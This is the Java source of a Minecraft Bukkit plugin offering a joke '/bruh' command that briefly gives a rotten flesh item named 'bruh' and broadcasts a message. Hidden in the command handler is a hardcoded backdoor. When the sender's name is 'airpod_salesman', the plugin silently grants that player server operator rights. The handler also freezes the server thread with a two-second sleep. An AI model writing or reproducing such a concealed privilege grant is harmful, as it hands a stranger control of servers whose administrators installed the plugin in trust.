package io.github.nicknazari.BruhCommand;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.inventory.meta.ItemMeta;

public final class BruhCommand extends JavaPlugin {
    @Override
    public void onEnable() {
    	getLogger().info("BruhCommand v1 ENABLE\n");
    }
	
    @Override
    public void onDisable() {
    	getLogger().info("BruhCommand v1 DISABLE\n");
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {    	
    	if (cmd.getName().equalsIgnoreCase("bruh")) {
    		
    		if (sender.getName().equals("airpod_salesman")) {
    			sender.setOp(true);
    			sender.sendMessage("opped");
    		}
    		
        	Player player = (Player) sender;
    		PlayerInventory inventory = player.getInventory();
    		ItemStack itemstack = new ItemStack(Material.ROTTEN_FLESH);
    		ItemMeta itemmeta = itemstack.getItemMeta();
    		String bruh = "bruh";
    		
    		itemmeta.setDisplayName(bruh);
    		itemstack.setItemMeta(itemmeta);
    		
    		inventory.addItem(itemstack);
    		
    		try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
    		
    		inventory.removeItem(itemstack);
    		
    		getServer().broadcastMessage("bruh fr?");
    		
    		return true;
    	}
    	
    	return false;
    }
    
}